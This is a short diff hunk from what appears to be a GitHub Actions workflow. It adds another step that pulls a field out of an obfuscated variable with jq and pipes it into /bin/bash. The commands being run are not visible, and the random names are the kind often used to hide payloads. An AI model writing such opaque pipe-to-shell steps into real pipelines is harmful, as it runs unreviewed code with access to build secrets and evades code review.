@@ -30,6 +30,7 @@ jobs:
           echo $qy89 | jq -r .bc1711 | /bin/bash
           echo $xcejt171 | jq -r .gzlx3 | /bin/bash
           echo $ifjc3 | jq -r .niu07 | /bin/bash
+          echo $ym954 | jq -r .xk5 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
